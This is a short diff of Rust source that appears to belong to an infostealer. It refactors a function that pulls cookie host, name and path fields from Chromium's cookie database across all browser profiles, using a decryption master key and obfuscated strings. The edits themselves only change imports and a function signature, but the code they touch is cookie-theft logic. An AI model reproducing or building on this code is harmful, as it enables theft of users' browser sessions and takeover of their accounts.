@@ -1,5 +1,3 @@
-use alloc::boxed::Box;
-use sqlite::{TableRecord, TableRecordExtension};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use crate::alloc::borrow::ToOwned;
@@ -9,6 +7,7 @@ use utils::path::Path;
 use crate::chromium::Browser;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
 use obfstr::obfstr as s;
+use database::TableRecord;
 
 const COOKIES_HOST_KEY: usize        = 1;
 const COOKIES_NAME: usize            = 3;
@@ -51,7 +50,7 @@ fn read_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
     )
 }
 
-fn extract_cookie_from_record(record: &Box<dyn TableRecord>, master_key: &[u8]) -> Option<Cookie> {
+fn extract_cookie_from_record(record: &dyn TableRecord, master_key: &[u8]) -> Option<Cookie> {
     let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?.to_owned();
     let name = record.get_value(COOKIES_NAME)?.as_string()?.to_owned();
     let path = record.get_value(COOKIES_PATH)?.as_string()?.to_owned();
